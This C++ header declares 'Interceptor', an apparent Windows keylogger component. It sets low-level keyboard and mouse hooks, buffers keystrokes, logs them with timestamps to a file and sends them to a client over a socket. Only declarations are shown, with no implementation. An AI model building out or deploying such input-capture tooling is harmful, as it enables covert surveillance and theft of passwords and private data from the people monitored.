#pragma once

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <SDKDDKVer.h>
#include <windows.h>
#include <vector>
#include <ctime>
#include <string>
#include <fstream>
#include <winsock2.h>

class Interceptor {

private:
    static Interceptor* instance;

    HINSTANCE appDescr;
    HHOOK keyboardHookDescr;
    HHOOK mouseHookDesct;

    std::ofstream file;
    DWORD prevSmbl;
    std::string buffer;
    std::string curDateTime;

    SOCKET socketDescr;

    Interceptor();

    int initHooks();
    int initFile(const char* fileDest);
    void getCurrentTime();

    ~Interceptor();
public:

    static Interceptor* getInstance();
    int init(const char* fileDest, const SOCKET& _socketDescr);
    void writeToFile();
    void writeToFileBuffNotClear();
    void sendMessageToClient();

    HHOOK getKeyboardHookDescr();
    HHOOK getMouseHookDesct();
    DWORD getPrevSmbl();
    void setPrevSmbl(const DWORD& _prevSmbl);
    std::string& getBuffer();
};

namespace InterceptorCallBacks {
    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
}
